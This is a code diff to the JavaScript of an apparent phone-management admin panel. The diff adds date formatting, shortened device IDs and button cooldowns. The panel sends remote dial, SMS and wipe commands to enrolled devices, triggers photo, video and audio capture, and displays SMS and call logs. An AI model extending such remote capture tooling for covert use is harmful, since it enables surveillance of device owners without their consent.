@@ -107,16 +107,26 @@
         if (parts.length === 4) return parts[0] + '.' + parts[1] + '.*.*';
         return ip;
       }
+      function formatBackendTime(s) {
+        if (!s) return '—';
+        var d = new Date(s);
+        if (isNaN(d.getTime())) return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var pad = function (x) { return (x < 10 ? '0' : '') + x; };
+        return d.getFullYear() + '/' + pad(d.getMonth() + 1) + '/' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
+      }
       function buildDeviceRow(d) {
-        var deviceId = (d.device_id || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var fullDeviceId = (d.device_id || '');
+        var deviceIdDisplay = fullDeviceId.length > 8 ? fullDeviceId.slice(-8) : fullDeviceId;
+        deviceIdDisplay = deviceIdDisplay.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var fullDeviceIdEsc = fullDeviceId.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
         var nickname = (d.nickname || '—').replace(/</g, '&lt;').replace(/>/g, '&gt;');
         var uidMasked = (d.uid || '').length > 4 ? (d.uid).slice(0, 2) + '***' + (d.uid).slice(-2) : (d.uid || '—');
         var model = deviceModelFromInfo(d.device_info).replace(/</g, '&lt;').replace(/>/g, '&gt;');
         var ipDisplay = maskIp(d.last_ip || '');
-        var timeDisplay = (d.created_at || '—').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        var timeDisplay = formatBackendTime(d.created_at);
         return '<tr>' +
           '<td class="device-info-cell"><div class="device-info-block">' +
-          '<span class="info-row"><span class="info-label">' + i18n.t('deviceId') + '</span>: <span class="info-value device-id-value">' + deviceId + '</span></span>' +
+          '<span class="info-row"><span class="info-label">' + i18n.t('deviceId') + '</span>: <span class="info-value device-id-value" data-device-id="' + fullDeviceIdEsc + '">' + deviceIdDisplay + '</span></span>' +
           '<span class="info-row"><span class="info-label">' + i18n.t('usernameRole') + '</span>: <span class="info-value"><span data-masked="' + uidMasked + '" data-full="' + (d.uid || '').replace(/"/g, '&quot;') + '">' + uidMasked + '</span> / <span>' + i18n.t('userLabel') + '</span></span></span>' +
           '<span class="info-row"><span class="info-label">' + i18n.t('phoneNumber') + '</span>: <span class="info-value">—</span></span>' +
           '<span class="info-row"><span class="info-label">' + i18n.t('nickname') + '</span>: <span class="info-value info-value-nickname">' + nickname + '</span></span>' +
@@ -248,21 +258,51 @@
         var tr = btn.closest('tr');
         if (!tr) return '';
         var deviceIdEl = tr.querySelector('.device-id-value') || tr.querySelector('.device-info-cell .device-info-block .info-value');
-        return deviceIdEl ? deviceIdEl.textContent.trim() : '';
+        if (!deviceIdEl) return '';
+        var full = deviceIdEl.getAttribute('data-device-id');
+        return (full != null && full !== '') ? full : deviceIdEl.textContent.trim();
       }
-      function sendCommandToDevice(deviceId, cmd, params, btn) {
+      var DIAL_SMS_COOLDOWN_SEC = 10;
+      var CAPTURE_COOLDOWN_SEC = 20;
+      function startCooldown(btn, label, sec) {
+        if (!btn || !label) return;
+        var left = (sec > 0 ? sec : DIAL_SMS_COOLDOWN_SEC);
+        btn.disabled = true;
+        var tick = function() {
+          if (left <= 0) {
+            btn.disabled = false;
+            btn.textContent = label;
+            return;
+          }
+          btn.textContent = left + (i18n.t('cooldownSeconds') || '秒后可再点');
+          left--;
+          setTimeout(tick, 1000);
+        };
+        tick();
+      }
+      function sendCommandToDevice(deviceId, cmd, params, btn, cooldownSec) {
         if (!deviceId) { alert(i18n.t('deviceIdRequired') || '请先选择设备'); return; }
         if (!adminApi || !adminApi.sendCommand) { alert('API 未就绪'); return; }
         var label = btn ? btn.textContent : '';
         if (btn) { btn.disabled = true; btn.textContent = (i18n.t('sending') || '发送中') + '...'; }
         adminApi.sendCommand(deviceId, cmd, params || {}).then(function(res) {
-          if (btn) { btn.disabled = false; btn.textContent = label; }
+          if (cooldownSec && btn) {
+            startCooldown(btn, label, cooldownSec);
+          } else if (btn) {
+            btn.disabled = false;
+            btn.textContent = label;
+          }
           if (res && res.ok) { alert(i18n.t('commandSent') || '指令已下发'); return; }
           var msg = (i18n.t('sendFailed') || '下发失败');
           if (res && res.json) { res.json().then(function(b){ if (b && b.message) alert(b.message); else alert(msg); }).catch(function(){ alert(msg); }); }
           else { alert(msg); }
         }).catch(function(err) {
-          if (btn) { btn.disabled = false; btn.textContent = label; }
+          if (cooldownSec && btn) {
+            startCooldown(btn, label, cooldownSec);
+          } else if (btn) {
+            btn.disabled = false;
+            btn.textContent = label;
+          }
           alert(err && err.message ? err.message : (i18n.t('sendFailed') || '下发失败'));
         });
       }
@@ -362,7 +402,7 @@
         var d = new Date(n < 1e12 ? n * 1000 : n);
         if (isNaN(d.getTime())) return String(ms);
         var pad = function (x) { return (x < 10 ? '0' : '') + x; };
-        return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
+        return d.getFullYear() + '/' + pad(d.getMonth() + 1) + '/' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
       }
       function smsTypeText(t) { var n = t != null ? parseInt(t, 10) : NaN; if (isNaN(n)) return t != null ? String(t) : '—'; switch (n) { case 1: return '收'; case 2: return '发'; case 3: return '草稿'; default: return String(t); } }
       function callTypeText(t) { var n = t != null ? parseInt(t, 10) : NaN; if (isNaN(n)) return t != null ? String(t) : '—'; switch (n) { case 1: return '接听'; case 2: return '拨出'; case 3: return '未接'; default: return String(t); } }
@@ -509,22 +549,24 @@
         });
         document.querySelectorAll('.btn-dial-cmd').forEach(function(btn){
           btn.onclick = function(){
+            if (this.disabled) return;
             var deviceId = getDeviceIdFromButton(this);
             var cell = this.closest('.control-col-dial');
             var numberInput = cell ? cell.querySelector('.dial-number-input') : null;
             var number = numberInput ? numberInput.value.trim() : '';
-            sendCommandToDevice(deviceId, 'mop.cmd.dial', { number: number }, this);
+            sendCommandToDevice(deviceId, 'mop.cmd.dial', { number: number }, this, DIAL_SMS_COOLDOWN_SEC);
           };
         });
         document.querySelectorAll('.btn-sms-cmd').forEach(function(btn){
           btn.onclick = function(){
+            if (this.disabled) return;
             var deviceId = getDeviceIdFromButton(this);
             var cell = this.closest('.control-col-sms');
             var numberInput = cell ? cell.querySelector('.sms-number-input') : null;
             var bodyInput = cell ? cell.querySelector('.sms-body-input') : null;
             var number = numberInput ? numberInput.value.trim() : '';
             var body = bodyInput ? bodyInput.value.trim() : '';
-            sendCommandToDevice(deviceId, 'mop.cmd.sms', { number: number, body: body }, this);
+            sendCommandToDevice(deviceId, 'mop.cmd.sms', { number: number, body: body }, this, DIAL_SMS_COOLDOWN_SEC);
           };
         });
         document.querySelectorAll('.btn-wipe-cmd').forEach(function(btn){
@@ -536,13 +578,25 @@
           };
         });
         document.querySelectorAll('.btn-capture-photo').forEach(function(btn){
-          btn.onclick = function(){ var deviceId = getDeviceIdFromButton(this); sendCommandToDevice(deviceId, 'mop.cmd.capture.photo', {}, this); };
+          btn.onclick = function(){
+            if (this.disabled) return;
+            var deviceId = getDeviceIdFromButton(this);
+            sendCommandToDevice(deviceId, 'mop.cmd.capture.photo', {}, this, CAPTURE_COOLDOWN_SEC);
+          };
         });
         document.querySelectorAll('.btn-capture-video').forEach(function(btn){
-          btn.onclick = function(){ var deviceId = getDeviceIdFromButton(this); sendCommandToDevice(deviceId, 'mop.cmd.capture.video', { duration_sec: 18 }, this); };
+          btn.onclick = function(){
+            if (this.disabled) return;
+            var deviceId = getDeviceIdFromButton(this);
+            sendCommandToDevice(deviceId, 'mop.cmd.capture.video', { duration_sec: 18 }, this, CAPTURE_COOLDOWN_SEC);
+          };
         });
         document.querySelectorAll('.btn-capture-audio').forEach(function(btn){
-          btn.onclick = function(){ var deviceId = getDeviceIdFromButton(this); sendCommandToDevice(deviceId, 'mop.cmd.capture.audio', { duration_sec: 18 }, this); };
+          btn.onclick = function(){
+            if (this.disabled) return;
+            var deviceId = getDeviceIdFromButton(this);
+            sendCommandToDevice(deviceId, 'mop.cmd.capture.audio', { duration_sec: 18 }, this, CAPTURE_COOLDOWN_SEC);
+          };
         });
       }
       document.getElementById('auditModalClose').onclick = function(){ document.getElementById('auditModalOverlay').style.display = 'none'; };
